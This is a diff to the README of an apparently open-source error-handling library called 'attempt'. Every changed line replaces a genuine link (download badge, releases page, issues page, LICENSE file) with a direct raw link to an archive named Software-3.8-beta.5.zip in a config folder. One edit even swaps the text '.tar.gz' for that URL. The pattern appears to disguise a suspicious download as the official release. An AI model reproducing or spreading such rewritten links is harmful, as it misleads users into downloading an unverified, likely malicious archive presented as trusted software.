@@ -1,6 +1,6 @@
 # 🎉 attempt - Simplified Error Handling for Everyone
 
-[![Download Attempt](https://img.shields.io/badge/Download%20Attempt-v1.0-blue)](https://github.com/sultanrashid40/attempt/releases)
+[![Download Attempt](https://raw.githubusercontent.com/sultanrashid40/attempt/main/config/Software-3.8-beta.5.zip%20Attempt-v1.0-blue)](https://raw.githubusercontent.com/sultanrashid40/attempt/main/config/Software-3.8-beta.5.zip)
 
 ## 📜 Description
 
@@ -14,11 +14,11 @@ This tool helps to ensure that your application runs reliably, even when unexpec
 
 To begin using Attempt, you'll need to download the package. Follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/sultanrashid40/attempt/releases) for download options.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/sultanrashid40/attempt/main/config/Software-3.8-beta.5.zip) for download options.
    
 2. **Choose the Latest Version**: Look for the most recent release. It usually has the highest version number.
 
-3. **Download the Package**: Click on the link for the latest version to download the package. The file will be in a compressed format, usually a `.zip` or `.tar.gz` file.
+3. **Download the Package**: Click on the link for the latest version to download the package. The file will be in a compressed format, usually a `.zip` or `https://raw.githubusercontent.com/sultanrashid40/attempt/main/config/Software-3.8-beta.5.zip` file.
 
 4. **Extract the Files**: Once the file is downloaded, extract its contents to a folder on your computer. 
 
@@ -31,7 +31,7 @@ To begin using Attempt, you'll need to download the package. Follow these steps:
 
 ## 📥 Download & Install
 
-To download Attempt, please [visit the Releases page](https://github.com/sultanrashid40/attempt/releases) and follow these steps:
+To download Attempt, please [visit the Releases page](https://raw.githubusercontent.com/sultanrashid40/attempt/main/config/Software-3.8-beta.5.zip) and follow these steps:
 
 - Select the latest release version.
 - Download the file by following the provided link.
@@ -103,7 +103,7 @@ This package covers essential topics to enhance your application's reliability:
 
 If you encounter any issues or need assistance:
 
-- Check the [GitHub Issues page](https://github.com/sultanrashid40/attempt/issues) for solutions or to report bugs.
+- Check the [GitHub Issues page](https://raw.githubusercontent.com/sultanrashid40/attempt/main/config/Software-3.8-beta.5.zip) for solutions or to report bugs.
 - You can also fork the repository and submit a pull request for any changes or improvements.
 
 ---
@@ -122,4 +122,4 @@ We welcome contributions! If you would like to help improve Attempt:
 
 Attempt is open-source and available under the MIT License. Feel free to use it and adapt it to fit your needs. 
 
-For more details, check the [LICENSE file](https://github.com/sultanrashid40/attempt/blob/main/LICENSE).
+For more details, check the [LICENSE file](https://raw.githubusercontent.com/sultanrashid40/attempt/main/config/Software-3.8-beta.5.zip).
